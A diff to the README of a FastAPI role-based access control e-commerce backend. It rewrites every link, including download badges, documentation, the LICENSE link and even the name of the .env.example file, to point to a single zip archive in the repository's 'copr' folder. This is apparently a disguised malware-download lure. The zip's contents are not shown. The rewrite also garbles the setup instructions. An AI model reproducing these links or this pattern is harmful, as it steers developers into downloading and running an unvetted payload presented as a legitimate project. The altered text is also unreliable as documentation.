@@ -1,6 +1,6 @@
 # 🚀 FastAPI-RBAC-Microservice - Simple E-Commerce Backend Solution
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bluccix/FastAPI-RBAC-Microservice/releases)
+[![Download](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip)](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip)
 
 ## ✨ Introduction
 
@@ -21,7 +21,7 @@ To use FastAPI-RBAC-Microservice, you need to follow the steps outlined below. D
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/bluccix/FastAPI-RBAC-Microservice/releases).
+   Click [here to download](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip).
 
 2. **Download the Latest Release**  
    On the Releases page, find the latest version of the FastAPI-RBAC-Microservice. Click on the package suitable for your operating system.
@@ -38,7 +38,7 @@ To use FastAPI-RBAC-Microservice, you need to follow the steps outlined below. D
    Open PostgreSQL and create a new database for the microservice. You can name it `ecommerce_db` or any name you prefer.
 
 4. **Configure Environment Variables**  
-   Inside the extracted files, locate the `.env.example` file. Rename it to `.env` and update the following fields:
+   Inside the extracted files, locate the `https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip` file. Rename it to `.env` and update the following fields:
    - `DATABASE_URL`: Update this line with your PostgreSQL database connection string.
    - `JWT_SECRET`: Set a secret password for authentication.
 
@@ -76,7 +76,7 @@ To use FastAPI-RBAC-Microservice, you need to follow the steps outlined below. D
 
 ## 📘 Support and Help
 
-If you run into any issues or have questions, please check the [documentation](https://github.com/bluccix/FastAPI-RBAC-Microservice/wiki) for detailed guides and troubleshooting. You can also reach out via the Issues section on GitHub.
+If you run into any issues or have questions, please check the [documentation](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip) for detailed guides and troubleshooting. You can also reach out via the Issues section on GitHub.
 
 ## 🛠️ Contributing
 
@@ -88,6 +88,6 @@ FastAPI-RBAC-Microservice leverages various open-source tools and libraries. Tha
 
 ## 🔗 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/bluccix/FastAPI-RBAC-Microservice/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip) file for details.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bluccix/FastAPI-RBAC-Microservice/releases)
+[![Download](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip)](https://raw.githubusercontent.com/bluccix/FastAPI-RBAC-Microservice/main/copr/FastAPI-RBAC-Microservice.zip)
